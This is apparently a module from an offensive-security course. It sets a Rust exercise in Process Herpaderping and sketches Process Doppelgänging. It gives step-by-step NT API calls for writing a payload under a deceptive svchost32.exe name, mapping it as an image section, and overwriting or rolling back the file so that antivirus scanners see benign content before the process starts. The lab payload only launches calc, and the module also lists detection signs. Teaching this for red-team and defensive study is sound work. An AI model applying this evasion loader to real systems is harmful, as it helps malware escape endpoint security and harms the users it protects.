# Module 28 — Process Doppelgänging & Herpaderping

## Concept

Both techniques exploit the gap between **what the OS maps into memory** and **what a scanner sees on disk**.

Traditional AV/EDR catches malicious executables at three moments:
1. When the file is written to disk
2. When the file is opened for execution
3. Periodically scanning files already on disk

Both Doppelgänging and Herpaderping subvert step 2 and 3 by ensuring the file on disk is benign by the time the scanner looks at it.

### Comparison

| Property | Process Hollowing (Module 04) | Herpaderping | Doppelgänging |
|---|---|---|---|
| File on disk | No payload on disk | Payload written then overwritten | Payload written in transaction, rolled back |
| Scanner sees | Legitimate host process | Benign overwrite | Original file (transaction rolled back) |
| NT primitive | `VirtualAllocEx` + `WriteProcessMemory` | `NtCreateSection(SEC_IMAGE)` + `NtCreateProcessEx` | `NtCreateSection` on transacted file |
| Complexity | Medium | High | Very High |
| Detection surface | Remote thread, hollowed image | File timing race, section-to-process mismatch | Transacted file I/O APIs |

### Why a file-backed section

`NtCreateSection` with the `SEC_IMAGE` flag tells the kernel to:
1. Parse the PE headers from the file
2. Create a memory-mapped section with correct permissions (r/w/rx per section flags)
3. Apply base relocations and set up the image correctly

Once the section exists in kernel space, it is **independent of the file on disk**. You can delete or overwrite the file and the section is unaffected. This is the key insight both techniques exploit.

---

## Herpaderping

Herpaderping was published by Johnny Shaw (2020). It is the simpler of the two techniques and is the focus of this module's implementation task.

### The attack sequence

```
Write payload to disk
        │
        ▼
NtCreateSection(SEC_IMAGE, file_handle)
  → kernel maps payload as PE image section
        │
        ▼
Overwrite file on disk with benign content ← AV now sees benign file
        │
        ▼
NtCreateProcessEx(section_handle)
  → process created from the in-memory section (payload still running)
        │
        ▼
NtCreateThreadEx → ResumeThread → payload executes
```

The race condition: the scanner opens the file to scan it *after* you've overwritten it. The window is typically milliseconds. Process Hacker and similar tools will show the process image path pointing to the overwritten file, and the bytes on disk will be benign.

---

## This module has two crates

Build `hollow-payload` first — this crate embeds it as the payload PE:

```
cargo build --target x86_64-pc-windows-gnu -p hollow-payload
cargo build --target x86_64-pc-windows-gnu -p process-doppelganging
```

Only `process-doppelganging.exe` goes to the VM.

---

## Task — Herpaderping

Implement `herpaderping()` in `src/main.rs`.

### Step 1 — Write the payload PE to a temp file

```
CreateFileA(
    lpfilename: PCSTR,                               // full path — "C:\\Windows\\Temp\\svchost32.exe\0"
                                                     //   use a name that looks legitimate
    dwdesiredaccess: FILE_ACCESS_RIGHTS,             // GENERIC_READ | GENERIC_WRITE
                                                     //   needs read for NtCreateSection later
    dwsharemode: FILE_SHARE_MODE,                    // FILE_SHARE_READ — allow readers while open
    lpsecurityattributes: Option<*const SECURITY_ATTRIBUTES>, // None — default security
    dwcreationdisposition: FILE_CREATION_DISPOSITION, // CREATE_ALWAYS — truncate if exists
    dwflagsandattributes: FILE_FLAGS_AND_ATTRIBUTES,  // FILE_ATTRIBUTE_NORMAL
    htemplatefile: Option<HANDLE>,                   // None
) -> Result<HANDLE>                                  // error if path is not writable
```

```
WriteFile(
    hfile: HANDLE,                          // handle from CreateFileA
    lpbuffer: *const c_void,               // PAYLOAD.as_ptr() as *const c_void
    nnumberofbytestowrite: u32,            // PAYLOAD.len() as u32
    lpnumberofbyteswritten: Option<*mut u32>, // None
    lpoverlapped: Option<*mut OVERLAPPED>,    // None — synchronous
) -> Result<()>
```

### Step 2 — Create an image section from the file

```
NtCreateSection(
    SectionHandle: *mut HANDLE,                // out: handle to the new section object
    DesiredAccess: u32,                        // SECTION_ALL_ACCESS = 0x10000007
    ObjectAttributes: *mut OBJECT_ATTRIBUTES,  // null_mut() — no special attributes
    MaximumSize: *mut LARGE_INTEGER,           // null_mut() — infer size from file
    SectionPageProtection: u32,                // PAGE_READONLY.0 (2)
    AllocationAttributes: u32,                 // SEC_IMAGE.0 (0x1000000) — parse and map as PE
    FileHandle: HANDLE,                        // h_file from Step 1
) -> i32 (NTSTATUS)                            // 0 = STATUS_SUCCESS; negative = error
```

`SEC_IMAGE` is the flag that causes the kernel to validate the PE headers and produce a correctly-laid-out image section rather than a flat file mapping. If the PE is malformed, this call will fail with `STATUS_INVALID_IMAGE_FORMAT`.

### Step 3 — Overwrite the file on disk with benign content

This must happen **after** `NtCreateSection` succeeds and **as quickly as possible** after. The section is already in kernel memory; overwriting the file can't un-do that.

```
SetFilePointer(
    hfile: HANDLE,                                   // h_file
    ldistancetomove: i32,                            // 0 — seek to start
    lpdistancetomovehigh: Option<*mut i32>,          // None — offset fits in 32 bits
    dwmovemethod: SET_FILE_POINTER_MOVE_METHOD,      // FILE_BEGIN (0)
) -> u32                                             // 0xFFFFFFFF = INVALID_SET_FILE_POINTER (error)
```

```
SetEndOfFile(hfile: HANDLE) -> Result<()>   // truncates the file at the current position (start)
```

```
WriteFile(hfile, BENIGN.as_ptr() as _, BENIGN.len() as u32, None, None) -> Result<()>
```

After this, the file on disk contains the `BENIGN` constant — a harmless placeholder. A scanner that opens the file now sees no malicious content.

### Step 4 — Create a process from the section

```
NtCreateProcessEx(
    ProcessHandle: *mut HANDLE,             // out: handle to the new process
    DesiredAccess: u32,                     // PROCESS_ALL_ACCESS.0 = 0x1FFFFF
    ObjectAttributes: *mut OBJECT_ATTRIBUTES, // null_mut()
    ParentProcess: HANDLE,                  // GetCurrentProcess() — inherit environment
    Flags: u32,                             // 0 — no special flags
    SectionHandle: HANDLE,                  // h_section from Step 2
    DebugPort: HANDLE,                      // HANDLE::default() — no debugger
    ExceptionPort: HANDLE,                  // HANDLE::default()
    InJob: u32,                             // 0
) -> i32 (NTSTATUS)                         // 0 = STATUS_SUCCESS
```

This creates a process with the payload image mapped, but **no threads** — the process is completely inert until you create one. The process object is visible in Task Manager immediately, pointing to the (now-overwritten, benign) file on disk.

### Step 5 — Determine the entry point

Parse `PAYLOAD` locally (same PE parsing as Module 04, Step 5):

```rust
let dos  = PAYLOAD.as_ptr() as *const IMAGE_DOS_HEADER;
let nt   = PAYLOAD.as_ptr().add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
let entry_rva      = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
let entry_point    = (preferred_base + entry_rva) as *mut c_void;
```

For simplicity, assume the image is loaded at its preferred base. If the OS didn't honour that, you would need to read the actual base via `NtQueryInformationProcess + ReadProcessMemory` (as in Module 04, Steps 2–3).

### Step 6 — Create and resume the initial thread

```
NtCreateThreadEx(
    ThreadHandle: *mut HANDLE,          // out: handle to the new thread
    DesiredAccess: u32,                 // THREAD_ALL_ACCESS = 0x1FFFFF
    ObjectAttributes: *mut OBJECT_ATTRIBUTES, // null_mut()
    ProcessHandle: HANDLE,              // h_process from Step 4
    StartRoutine: *mut c_void,          // entry_point — address in the remote process
    Argument: *mut c_void,              // null_mut() — no argument
    CreateFlags: u32,                   // 0x1 = THREAD_CREATE_FLAGS_CREATE_SUSPENDED
                                        //   create it suspended so you can inspect first
    ZeroBits: usize,                    // 0
    StackSize: usize,                   // 0 — default stack size
    MaximumStackSize: usize,            // 0
    AttributeList: *mut c_void,         // null_mut()
) -> i32 (NTSTATUS)                     // 0 = STATUS_SUCCESS
```

```
ResumeThread(
    hthread: HANDLE,  // h_thread from NtCreateThreadEx
) -> u32              // previous suspend count; 0xFFFFFFFF = error
```

---

## ntapi imports

These are not in the `windows` crate:

```rust
use ntapi::ntmmapi::NtCreateSection;
use ntapi::ntpsapi::{NtCreateProcessEx, NtCreateThreadEx};
```

All three return `i32` (`NTSTATUS`). Check for `== 0` (STATUS_SUCCESS) manually — there is no `?` operator for NTSTATUS.

---

## Process Doppelgänging — Concept Only

Doppelgänging (Tal Liberman & Eugene Kogan, 2017) uses NTFS Transacted File I/O to make the payload-on-disk window **zero-length** rather than just very short.

### The sequence

```rust
// 1. Open a transaction
let h_txn = CreateTransaction(null_mut(), null_mut(), 0, 0, 0, 0, null_mut());

// 2. Open a file within the transaction — only visible to this transaction
let h_file = CreateFileTransactedA("payload.exe\0", GENERIC_READ|GENERIC_WRITE,
                                   0, null_mut(), CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, ..., h_txn, ...);

// 3. Write payload into the transacted file
WriteFile(h_file, PAYLOAD.as_ptr(), PAYLOAD.len(), ...);

// 4. Create a section from the transacted file (same as Herpaderping step 2)
NtCreateSection(&mut h_section, SECTION_ALL_ACCESS, null_mut(), null_mut(),
                PAGE_READONLY, SEC_IMAGE, h_file);

// 5. Roll back the transaction — the file DISAPPEARS from disk
RollbackTransaction(h_txn);
// The file was never committed. To any scanner or the filesystem, it never existed.
// But the section in kernel memory persists.

// 6-8: NtCreateProcessEx + NtCreateThreadEx + ResumeThread (same as Herpaderping)
```

### Why it's harder

- `CreateFileTransacted`, `RollbackTransaction` are deprecated and may be blocked by some Windows versions (Windows 10 1809+)
- Requires `KtmW32.dll` which is not always available
- Anti-virus vendors specifically look for transacted file I/O followed by section creation as a high-confidence indicator
- NTAPI calls needed: `NtCreateProcessEx`, `NtCreateUserProcess` (more complex than `NtCreateProcessEx`)

Doppelgänging is included here for conceptual completeness. The implementation exercise focuses on Herpaderping, which is simpler and still effective against file-based scanners.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p hollow-payload` builds first
- [ ] `cargo build --target x86_64-pc-windows-gnu -p process-doppelganging` succeeds
- [ ] Running on the VM: the payload (`calc.exe`) launches
- [ ] In Process Hacker: the process image path points to `svchost32.exe`; opening that file shows benign/empty content, not the payload
- [ ] `NtCreateSection` NTSTATUS is checked (`== 0`)
- [ ] `NtCreateProcessEx` NTSTATUS is checked
- [ ] `NtCreateThreadEx` NTSTATUS is checked
- [ ] `ResumeThread` return value checked (`!= 0xFFFFFFFF`)
- [ ] All handles closed at exit (`CloseHandle` for file, section, process, thread)

---

## Key Types

**`HANDLE`** — all NT object handles are this type. Default (zero) value is not a valid handle. Check validity with `.is_invalid()` for Win32 calls; check NTSTATUS for ntapi calls.

**`NTSTATUS (i32)`** — NT error code. `0` = `STATUS_SUCCESS`. Negative values are errors. Use `format!("{:#x}", status)` to print as hex for debugging.

**`SEC_IMAGE`** — `PAGE_PROTECTION_FLAGS` value `0x1000000`. Causes `NtCreateSection` to interpret the file as a PE image, apply section permissions from headers, and set up the image correctly.

**`SECTION_ALL_ACCESS`** — not defined in `ntapi` as a constant; use `0x10000007u32` directly.

**`THREAD_CREATE_FLAGS_CREATE_SUSPENDED`** — `0x1u32` — the `CreateFlags` value for `NtCreateThreadEx` that creates the thread in a suspended state.

---

## Hints

- `NtCreateSection`, `NtCreateProcessEx`, and `NtCreateThreadEx` are in the `ntapi` crate (`ntapi::ntmmapi` and `ntapi::ntpsapi`). They take raw pointers — use `null_mut()` for the NULL ones.
- `SetFilePointer` returns `INVALID_SET_FILE_POINTER` (`0xFFFFFFFF`) on error, not a `Result<()>`. Check it manually.
- The payload is the same `hollow_payload.exe` used in Module 04. Build that crate first.
- If `NtCreateSection` fails with `STATUS_INVALID_IMAGE_FORMAT (0xC000007B)`, the payload PE is corrupt or the `include_bytes!` path is wrong — verify the path and that `hollow-payload` was built.
- `NtCreateProcessEx` does not set up the PEB, heap, or TLS. For a real payload, you'd also need to call `RtlCreateProcessParameters` and write the result to the remote PEB. For `hollow_payload.exe` (which just spawns calc), the minimal setup is usually sufficient because the CRT handles most initialisation.
- After calling `ResumeThread`, wait briefly before closing handles: `WaitForSingleObject(h_process, 5000)`.

---

## Submission

Paste `src/main.rs` and include a screenshot of Process Hacker showing: the running process name, its image path (the temp file), and either the Process Hacker "Strings" view or a hex editor showing the overwritten benign content on disk.
